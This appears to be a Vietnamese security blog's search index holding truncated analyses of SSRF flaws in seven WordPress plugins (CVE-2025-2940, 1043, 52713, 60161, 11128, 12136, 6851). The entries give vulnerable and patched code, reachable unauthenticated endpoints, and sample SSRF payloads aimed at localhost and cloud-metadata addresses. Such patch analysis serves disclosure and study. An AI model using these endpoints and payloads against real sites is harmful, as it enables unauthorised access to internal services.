[{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Ninja Tables Plugin.","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Ninja Tables – Easy Data Table Builder cho WordPress tồn tại lỗ hổng Server-Side Request Forgery (SSRF) trong tất cả các phiên bản cho đến và bao gồm 5.0.18, thông qua tham số args[url]. Lỗ hổng này cho phép unauthenticated attackers thực hiện các web requests đến các arbitrary locations bắt nguồn từ web application, và có thể được sử dụng để query và modify thông tin từ các internal services. CVE ID: CVE-2025-2940 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.0.18 Patched Versions: 5.0.19 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress Ninja Tables Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Ninja Tables: 5.0.18 (vulnerable) và 5.0.19 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Theo mô tả của CVE, vị trí đáng chú ý trong patch là chỗ mã xử lý args[url] — đây có thể là nguyên nhân chính dẫn đến lỗ hổng vì tham số này được sử dụng trực tiếp trong luồng thực hiện request. Vị trí tiền đề gây ra lỗ hổng Trong bản vá, đoạn mã dễ bị lợi dụng này đã được vô hiệu hoá (comment bằng //). Vulnerable Code public static function registerAsyncRequestHandler() { $action = static::makeAsyncRequestAction(); App::addAction(\"admin_post_nopriv_{$action}\", function() { $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); $client = Client::make($requestUrl); $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; $callback = static::getCallback($params); $response = $client-\u003e{$requestMethod}('', $params); if (is_wp_error($response)) { $exception = new Exception( $response-\u003eget_error_message(), 500 ); } return $callback($response, $exception ?? null); }); } Hàm registerAsyncRequestHandler() là một trình đăng ký để tạo và xử lý một endpoint async trong WordPress - cụ thể là qua admin_post_nopriv_{action}, tức là hook cho phép người dùng chưa đăng nhập (nopriv) cũng có thể gửi request đến. Cụ thể, hàm sẽ xử lý như sau: Tạo tên action duy nhất cho plugin $action = static::makeAsyncRequestAction(); protected static function makeAsyncRequestAction() { return 'wpf-async-request-' . sha1( App::config()-\u003eget('app.slug') // plugin name: ninja-tables ); } Hàm makeAsyncRequestAction() tạo ra một chuỗi định danh duy nhất cho plugin bằng cách nối tiền tố cố định (wpf-async-request-) với giá trị SHA1 hash của tên plugin (app.slug). Vì plugin hiện tại có tên là \"ninja-tables\", nên kết quả trả về sẽ là: wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 Đăng ký action hook với callback là Anonymous function App::addAction(\"admin_post_nopriv_{$action}\", function() { ... }); Khi có HTTP request gửi đến endpoint /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 thì logic trong anonymous function sẽ được gọi. Lấy instance của Request object từ container App và lấy 2 tham số chính $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); Khởi tạo đối tượng Client với baseUrl lấy từ request $client = Client::make($requestUrl); public static function make($baseUrl = '', $args = []) { $args['cookies'] = $args['cookies'] ?? []; $args['headers'] = $args['headers'] ?? []; $args['options'] = $args['options'] ?? []; return new static($baseUrl, $args); } Phương thức Client::make() chịu trách nhiệm tạo và cấu hình một instance mới của lớp Client, dùng để quản lý và gửi các HTTP request. Giá trị $baseUrl được truyền trực tiếp từ $requestUrl - tức là URL mà người dùng cung cấp trong tham số args.url. Lấy tất cả tham số khác ngoài action, args.url, args.method $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; Giải mã và lấy hàm callback từ tham số request $callback = static::getCallback($params); protected static function g","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Embed Any Document Plugin.","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin “Embed Any Document – Embed PDF, Word, PowerPoint and Excel Files” cho WordPress có lỗ hổng Server-Side Request Forgery (SSRF) trong tất cả các phiên bản đến và bao gồm 2.7.5 thông qua shortcode 'embeddoc'. Lỗ hổng này cho phép những kẻ tấn công đã xác thực, có quyền truy cập ở mức Contributor trở lên, thực hiện các yêu cầu web tới các địa chỉ tùy ý xuất phát từ ứng dụng web và có thể được sử dụng để truy vấn và sửa đổi thông tin từ các dịch vụ nội bộ. CVE ID: CVE-2025-1043 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.7.5 Patched Versions: 2.7.6 CVSS severity: Low (4.9) Required Privilege: Contributor Product: WordPress Embed Any Document Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Embed Any Document: 2.7.5 (vulnerable) và 2.7.6 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff public function embed_shortcode( $atts ) { ... $show = false; $shortcode_atts = shortcode_atts( array( 'url' =\u003e '', 'drive' =\u003e '', 'viewer' =\u003e $default_provider, 'download' =\u003e $default_download, ... ), $atts ); if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) : ... if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } $url = esc_url( $shortcode_atts['url'], array( 'http', 'https' ) ); if ( $show ) { $filedata = wp_remote_head( $shortcode_atts['url'] ); ... } ... return $embed; } Trong phiên bản lỗi, hàm embed_shortcode() thực hiện một HTTP HEAD request bằng hàm wp_remote_head() với giá trị url được lấy trực tiếp từ $shortcode_atts['url']. Do không có bất kỳ cơ chế xác thực, lọc, hoặc giới hạn phạm vi URL, kẻ tấn công có thể chèn vào đó một đường dẫn tùy ý =\u003e Dẫn đến request có thể gửi đến các local service khác gấy SSRF public function embed_shortcode( $atts ) { ... $show = false; $shortcode_atts = shortcode_atts( array( 'url' =\u003e '', 'drive' =\u003e '', 'viewer' =\u003e $default_provider, 'download' =\u003e $default_download, ... ), $atts ); if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) : ... if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } $url = esc_url( $shortcode_atts['url'], array( 'http', 'https' ) ); if ( $show ) { $filedata = wp_safe_remote_head( $shortcode_atts['url'] ); ... } ... return $embed; } Bản vá đã thay thế việc sử dụng wp_remote_head() bằng hàm wp_safe_remote_head(), hàm này bổ sung các cơ chế kiểm tra an toàn nhằm ngăn chặn truy cập đến các địa chỉ nội bộ, private, loopback hoặc link-local, qua đó giảm thiểu nguy cơ tấn công SSRF. Vulnerable Code Để đoạn wp_remote_head( $shortcode_atts['url'] ) trong embed_shortcode() thực sự được gọi, ta cần bypass tất cả các ràng buộc sau: url phải tồn tại và không rỗng if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) Biến $show phải được đặt thành true trước khi vào khối gọi HEAD $show mặc định false. Nó chỉ trở thành true khi if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) trả về true và một trong hai điều kiện sau đúng: if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } download bằng 'alluser' hoặc 'all'. download bằng 'logged' và is_user_logged_in() trả về true (tức người dùng đã đăng nhập). public function allowdownload( $provider ) { $blacklist = array( 'drive', 'box' ); if ( in_array( $provider, $","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin.","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Lỗ hổng Server-Side Request Forgery (SSRF) trong plugin BoldGrid Post and Page Builder by BoldGrid – Visual Drag and Drop Editor cho phép kẻ tấn công thực hiện yêu cầu giả mạo từ phía máy chủ. Vấn đề này ảnh hưởng đến plugin Post and Page Builder by BoldGrid – Visual Drag and Drop Editor từ phiên bản chưa xác định cho đến 1.27.8. CVE ID: CVE-2025-52713 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 1.27.8 Patched Versions: 1.27.9 CVSS severity: Low (6.4) Required Privilege: Contributor Product: WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Post and Page Builder by BoldGrid – Visual Drag and Drop Editor: 1.27.8 (vulnerable) và 1.27.9 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff public function get_redirect_url() { $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null; self::validate_nonce( 'image' ); $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop\u0026fm=jpg\u0026h=800\u0026q=50\u0026w=1200'; $redirectUrls = array(); foreach( $urls as $url ) { $response = wp_remote_head( $url ); $headers = is_array( $response ) \u0026\u0026 ! empty( $response['headers'] ) ? $response['headers']-\u003egetAll() : array(); $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false; $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false; $redirectUrls[ $url ] = $redirectUrl; } if ( ! empty( $redirectUrls ) ) { wp_send_json_success( $redirectUrls ); } else { status_header( 400 ); wp_send_json_error(); } } Trong phiên bản lỗi, hàm get_redirect_url() nhận mảng URL từ $_POST['urls'], sau đó duyệt qua từng phần tử và gửi request bằng wp_remote_head($url) mà không hề kiểm tra hoặc lọc dữ liệu đầu vào. Việc này cho phép kẻ tấn công tự cung cấp URL tùy ý để máy chủ gửi yêu cầu tới các địa chỉ nội bộ như 127.0.0.1 hoặc 169.254.169.254, dẫn đến lỗ hổng SSRF. Ngoài ra, do không giới hạn timeout hay số lần redirection, hàm còn có thể bị lợi dụng để gây treo hoặc tấn công từ chối dịch vụ (DoS). public function get_redirect_url() { $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null; self::validate_nonce( 'image' ); $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop\u0026fm=jpg\u0026h=800\u0026q=50\u0026w=1200'; $redirectUrls = array(); foreach( $urls as $url ) { $response = wp_safe_remote_head( esc_url_raw( $url ), array( 'timeout' =\u003e 5, 'redirection' =\u003e 5, ) ); $headers = is_array( $response ) \u0026\u0026 ! empty( $response['headers'] ) ? $response['headers']-\u003egetAll() : array(); $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false; $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false; $redirectUrls[ $url ] = $redirectUrl; } if ( ! empty( $redirectUrls ) ) { wp_send_json_success( $redirectUrls ); } else { status_header( 400 ); wp_send_json_error(); } } Bản vá đã thay wp_remote_head() bằng wp_safe_remote_head() kết hợp với esc_url_raw() để lọc và chỉ cho phép URL hợp lệ, đồng thời bổ sung các tham số bảo vệ như timeout =\u003e 5 và redirection =\u003e 5. Nhờ đó, hàm chỉ gửi request đến các host an toàn, ngăn SSRF và hạn chế các rủi ro về hiệu năng. Vulnerable Code Hàm self::validate_nonce( 'image' ); trong đoạn mã được gọi để xác thực nonce — một cơ chế bảo vệ của WordPress nhằm ngăn CSRF (Cross-Site Request Forgery). public static function validate_nonce( $name ) { $nonce = ! empty( $_POST[ self::$nonces[ $name ] ] ) ? $_POST[ self::$nonces[ $name ] ] : null; $valid = wp_verify_nonce( $nonce, self::$nonces[ $name ] ); if ( ! $valid ) { status_header( 401 ); wp_send_json_error(); } } Cụ thể, plugin định nghĩa một mảng tĩnh $nonces chứa các tên nonce tương ứng với từng hành động: protected static $nonces = array( 'image' =\u003e 'boldgrid_gridblock_image_ajax_nonce', 'setup' =\u003e 'boldgrid_editor_setup', 'gridbloc","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress ZoloBlocks Plugin.","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Lỗ hổng Server-Side Request Forgery (SSRF) trong BdThemes ZoloBlocks cho phép kẻ tấn công thực hiện yêu cầu giả mạo từ phía máy chủ. Sự cố này ảnh hưởng đến các phiên bản ZoloBlocks từ không xác định cho đến 2.3.11. CVE ID: CVE-2025-60161 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.3.11 Patched Versions: 2.3.12 CVSS severity: Low (5.4) Required Privilege: Unauthenticated Product: WordPress ZoloBlocks Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - ZoloBlocks: 2.3.11 (vulnerable) và 2.3.12 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Lỗ hổng này xuất hiện trong tệp TemplatesV1.php, tuy nhiên tệp này đã bị loại bỏ trong phiên bản vá lỗi. TemplatesV1.php đã bị loại bỏ trong bản vá Vulnerable Code public function demo_import() { // Kiểm tra tham số đầu vào từ POST if (!isset($_POST['json_file_url'])) { wp_send_json_error('No JSON file URL provided'); return; } // Lấy và làm sạch URL người dùng cung cấp $json_file_url = sanitize_text_field(wp_unslash($_POST['json_file_url'])); // Gửi yêu cầu HTTP đến URL đó $response = wp_remote_get($json_file_url, ['timeout' =\u003e 30]); // Nếu lỗi khi fetch dữ liệu, trả JSON lỗi if (is_wp_error($response)) { wp_send_json_error('Failed to fetch JSON data'); return; } // Lấy nội dung phản hồi và giải mã JSON $body = wp_remote_retrieve_body($response); $data = json_decode($body, true); $content = $data['content'] ?? ''; // Trả kết quả JSON thành công cùng nội dung import wp_send_json_success([ 'status' =\u003e 'success', 'message' =\u003e __('Pattern imported successfully!', 'zoloblocks'), 'content' =\u003e $content, ]); } Lỗi Hàm demo_import() nhận URL từ người dùng =\u003e gửi yêu cầu HTTP (wp_remote_get) để tải dữ liệu JSON → giải mã và trả về kết quả qua wp_send_json_success(). Vì không kiểm tra hoặc giới hạn URL, nên có thể bị lợi dụng gây SSRF. Hàm demo_import() được đăng kí làm callback cho action hook: add_action('wp_ajax_nopriv_zolo_demo_import', [$this, 'demo_import']); Điều này có nghĩa là: Hook wp_ajax_nopriv_ được sử dụng cho người dùng chưa đăng nhập (anonymous users). Khi client gửi request AJAX đến endpoint /wp-admin/admin-ajax.php?action=zolo_demo_import, WordPress sẽ gọi hàm demo_import(). Flow graph TD A[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"] B --\u003e C[\"demo_import()\"] C --\u003e D[\"sanitize_text_field()\"] D --\u003e E[\"wp_remote_get(json_file_url)\"] E --\u003e F{\"is_wp_error(response)?\"} F -- Yes --\u003e G[\"wp_send_json_error()\"] F -- No --\u003e H[\"json_decode(body) → extract URLs\"] H --\u003e I[\"wp_send_json_success()\"] graph TD A[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"] B --\u003e C[\"demo_import()\"] C --\u003e D[\"sanitize_text_field()\"] D --\u003e E[\"wp_remote_get(json_file_url)\"] E --\u003e F{\"is_wp_error(response)?\"} F -- Yes --\u003e G[\"wp_send_json_error()\"] F -- No --\u003e H[\"json_decode(body) → extract URLs\"] H --\u003e I[\"wp_send_json_success()\"] graph TD A[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"] B --\u003e C[\"demo_import()\"] C --\u003e D[\"sanitize_text_field()\"] D --\u003e E[\"wp_remote_get(json_file_url)\"] E --\u003e F{\"is_wp_error(response)?\"} F -- Yes --\u003e G[\"wp_send_json_error()\"] F -- No --\u003e H[\"json_decode(body) → extract URLs\"] H --\u003e I[\"wp_send_json_success()\"] graph TD A[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"] B --\u003e C[\"demo_import()\"] C --\u003e D[\"sanitize_text_field()\"] D --\u003e E[\"wp_remote_get(json_file_url)\"] E --\u003e F{\"is_wp_error(response)?\"} F -- Yes --\u003e G[\"wp_send_json_error()\"] F -- No --\u003e H[\"json_decode(body) → extract URLs\"] H --\u003e I[\"wp_send_json_success()\"] Exploit Local Server Tạo local service đơn giản bằng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR,","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Feedzy Plugin.","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin RSS Aggregator của Feedzy – Feed to Post, Autoblogging, News \u0026 YouTube Video Feeds Aggregator cho WordPress bị lỗ hổng Server-Side Request Forgery trong tất cả các phiên bản đến và bao gồm 5.1.0 thông qua hàm 'feedzy_sanitize_feeds'. Điều này cho phép kẻ tấn công đã xác thực, với quyền truy cập ở mức Subscriber trở lên, thực hiện các yêu cầu web tới các địa chỉ tùy ý xuất phát từ ứng dụng web và có thể được sử dụng để truy vấn thông tin từ các dịch vụ nội bộ. CVE ID: CVE-2025-11128 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.1.0 Patched Versions: 5.1.1 CVSS severity: Low (5) Required Privilege: Subscriber Product: WordPress Feedzy Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Feedzy: 5.1.0 (vulnerable) và 5.1.1 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Plugin Feedzy RSS Aggregator đã đăng ký một REST API endpoint tại /feedzy/v1/feed/, cho phép người dùng gửi URL để lấy dữ liệu feed. Tuy nhiên, trong phiên bản 5.1.0, endpoint này được bảo vệ lỏng lẻo và cơ chế lọc URL không an toàn, dẫn đến lỗ hổng SSRF (Server-Side Request Forgery). Patch diff public function feedzy_register_rest_route() { register_rest_route( 'feedzy/v1', '/feed/', array( 'methods' =\u003e 'POST', 'callback' =\u003e array( $this, 'feedzy_rest_route' ), 'permission_callback' =\u003e function () { return is_user_logged_in(); }, 'args' =\u003e array( 'url' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_feeds' ), ), 'category' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_categories' ), ), ), ) ); } public function feedzy_sanitize_feeds( $input ) { if ( count( $input ) === 1 ) { $feed = esc_url( $input[0] ); return $feed; } else { $feeds = array(); foreach ( $input as $item ) { $feeds[] = esc_url( $item ); } return $feeds; } } Trong phiên bản lỗi: Endpoint chỉ kiểm tra is_user_logged_in(), tức là bất kỳ tài khoản đã đăng nhập nào (kể cả Subscriber) đều có thể gửi request. Hàm feedzy_sanitize_feeds() chỉ sử dụng esc_url() - hàm này chỉ làm sạch chuỗi URL để hiển thị, không xác thực tính hợp lệ hay giới hạn truy cập nội bộ. Lỗi Do đó, attacker có thể gửi payload url=http://localhost:8001/admin để ép server gửi request đến dịch vụ nội bộ → SSRF. public function feedzy_register_rest_route() { register_rest_route( 'feedzy/v1', '/feed/', array( 'methods' =\u003e 'POST', 'callback' =\u003e array( $this, 'feedzy_rest_route' ), 'permission_callback' =\u003e function ( WP_REST_Request $request ) { $post_id = absint( $request-\u003eget_param( 'postId' ) ); return current_user_can( 'edit_post', $post_id ); }, 'args' =\u003e array( 'url' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_feeds' ), ), 'category' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_categories' ), ), ), ) ); } public function feedzy_sanitize_feeds( $input ) { if ( count( $input ) === 1 ) { $feed = wp_http_validate_url( $input[0] ); return $feed; } else { $feeds = array(); foreach ( $input as $item ) { if ( wp_http_validate_url( $item ) ) { $feeds[] = esc_url_raw( $item ); } } return $feeds; } } Bản vá đã: Giới hạn quyền truy cập REST API bằng current_user_can( 'edit_post', $post_id ), chỉ cho phép Editor hoặc Admin có quyền gọi endpoint. Thay thế esc_url() bằng wp_http_validate_url(), đảm bảo URL hợp lệ, chỉ chấp nhận giao thức http/https, và loại bỏ địa chỉ nội bộ (loopback, localhost, 127.0.0.1...). Sử dụng esc_url_raw() để lưu URL an toàn mà không tự động mã hóa lại. Thông tin Hàm count() trong feedzy_sanitize_feeds() yêu cầu tham số đầu vào phải thuộc kiểu Countable hoặc array. Nếu truyền vào một string, PHP sẽ ném lỗi: Lỗi Exception has occurred. TypeError: count(): Argument #1 ($value) must be of type Countable|array, string given Vì vậy, khi gửi request đến endpoint, cần truyền tham số url dưới dạng mảng, ví dụ: url[0]=\"http://example.com\" Vulnerable Code feedzy_rest_route() được ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Real Cookie Banner Plugin.","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin The Real Cookie Banner: GDPR \u0026 ePrivacy Cookie Consent cho WordPress bị lỗ hổng Server-Side Request Forgery trong tất cả các phiên bản đến và bao gồm 5.2.4. Nguyên nhân là do kiểm tra không đầy đủ URL do người dùng cung cấp tại REST API endpoint /scanner/scan-without-login. Điều này cho phép những kẻ tấn công đã xác thực, có quyền truy cập cấp administrator trở lên, thực hiện các yêu cầu web tới các địa chỉ tùy ý xuất phát từ ứng dụng web và có thể được sử dụng để truy vấn và sửa đổi thông tin từ các dịch vụ nội bộ thông qua tham số url. CVE ID: CVE-2025-12136 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.2.4 Patched Versions: 5.2.5 CVSS severity: Low (5.5) Required Privilege: Administrator Product: WordPress Real Cookie Banner Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Real Cookie Banner: 5.2.4 (vulnerable) và 5.2.5 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff public function routeScanWithoutLogin($request) { $url = $request-\u003eget_param('url'); $jobId = $request-\u003eget_param('jobId'); if ($checker-\u003estart($url, \\false)) { $requestArguments = $checker-\u003egetRequestArguments(); $result = \\wp_remote_get($url, ['redirection' =\u003e 0, 'cookies' =\u003e $requestArguments['cookies'], 'headers' =\u003e $requestArguments['headers'], 'timeout' =\u003e $requestArguments['timeout'], 'sslverify' =\u003e $requestArguments['sslverify']]); $status = \\wp_remote_retrieve_response_code($result); $ok = $status \u003e= 200 \u0026\u0026 $status \u003c 300; $location = \\wp_remote_retrieve_header($result, 'Location'); return new WP_REST_Response(['status' =\u003e $status, 'statusText' =\u003e \\wp_remote_retrieve_response_message($result), 'ok' =\u003e $ok, 'headers' =\u003e (object) \\wp_remote_retrieve_headers($result), 'redirected' =\u003e !empty($location), 'responseUrl' =\u003e $location, 'body' =\u003e \\wp_remote_retrieve_body($result)]); } else { return new WP_Error('rest_scan_without_login_error', 'Loopback request could not be started.'); } } Trong phiên bản lỗi, hàm routeScanWithoutLogin() nhận tham số url trực tiếp từ $request-\u003eget_param('url') và sử dụng nó ngay trong lệnh wp_remote_get() mà không có bất kỳ cơ chế kiểm tra hoặc lọc nào =\u003e Điều này dẫn đến lỗ hổng Server-Side Request Forgery (SSRF). Phần trả về đóng gói toàn bộ kết quả từ wp_remote_get($url) thành JSON: status, statusText: mã và thông điệp HTTP. ok: true nếu mã 2xx. headers: toàn bộ header của response. redirected, responseUrl: thông tin redirect nếu có. body: nội dung trả về từ URL. =\u003e Server thực chất chuyển tiếp toàn bộ phản hồi từ URL nội bộ ra ngoài, gây rò rỉ dữ liệu khi bị SSRF. public function routeScanWithoutLogin($request) { $url = $request-\u003eget_param('url'); $jobId = $request-\u003eget_param('jobId'); // Validate that the URL belongs to the jobs' domain to prevent SSRF attacks $jobDataUrl = $job-\u003edata-\u003eurl; $parsed_url = \\wp_parse_url($url); if (!$parsed_url || !isset($parsed_url['host'])) { return new WP_Error('rest_invalid_url', 'Invalid URL provided'); } $current_domain = \\wp_parse_url($jobDataUrl, \\PHP_URL_HOST); if ($parsed_url['host'] !== $current_domain) { return new WP_Error('rest_invalid_domain', 'URL must belong to the jobs\\' domain'); } if ($checker-\u003estart($url, \\false)) { $requestArguments = $checker-\u003egetRequestArguments(); $result = \\wp_remote_get($url, ['redirection' =\u003e 0, 'cookies' =\u003e $requestArguments['cookies'], 'headers' =\u003e $requestArguments['headers'], 'timeout' =\u003e $requestArguments['timeout'], 'sslverify' =\u003e $requestArguments['sslverify']]); $status = \\wp_remote_retrieve_response_code($result); $ok = $status \u003e= 200 \u0026\u0026 $status \u003c 300; $location = \\wp_remote_retrieve_header($result, 'Location'); return new WP_REST_Response(['status' =\u003e $status, 'statusText' =\u003e \\wp_remote_retrieve_response_message($result), 'ok' =\u003e $ok, 'headers' =\u003e (object) \\wp_remote_retrieve_headers($result), 'redirected' =\u003e !empty($location), 'responseUrl' =\u003e $","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Broken Link Notifier Plugin.","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Broken Link Notifier cho WordPress bị lỗ hổng Server‑Side Request Forgery trong tất cả các phiên bản đến và bao gồm 1.3.0 thông qua hàm ajax_blinks() vốn cuối cùng gọi hàm check_url_status_code(). Điều này cho phép attacker chưa xác thực (unauthenticated attackers) thực hiện các yêu cầu web tới bất kỳ địa chỉ nào xuất phát từ ứng dụng web và có thể được dùng để truy vấn hoặc sửa đổi thông tin từ các dịch vụ nội bộ. CVE ID: CVE-2025-6851 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 1.3.0 Patched Versions: 1.3.1 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress Broken Link Notifier Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Broken Link Notifier: 1.3.0 (vulnerable) và 1.3.1 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff public function check_url_status_code( $url, $timeout = null ) { // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } ... // Check the link $response = wp_remote_get( $link, $http_request_args ); 